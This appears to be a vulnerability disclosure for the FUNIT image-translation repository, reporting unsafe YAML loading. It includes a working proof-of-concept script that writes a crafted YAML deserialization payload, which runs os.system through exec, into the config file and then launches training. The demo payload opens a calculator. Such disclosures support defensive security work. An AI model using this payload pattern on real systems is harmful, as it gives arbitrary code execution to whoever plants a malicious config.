# Description

`FUNIT` translate images to unseen domains in the test time with few example images. , which is vulnerable to `Arbitrary Code Execution`.

# Vulnerability

Vulnerable to YAML deserialization attack caused by unsafe loading.

# Proof of Concept

### Installation
```bash
git clone https://github.com/NVlabs/FUNIT.git
```

### Run exploit.py
```
import os
#os.system('git clone https://github.com/NVlabs/FUNIT.git')
os.chdir('FUNIT/')
payload = """cmd: !!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('configs/config.yml','w+').write(payload)
os.system('python train.py --config configs/config.yml')
```
* `python3 exploit.py`

# Impact

Arbitary Code Execution
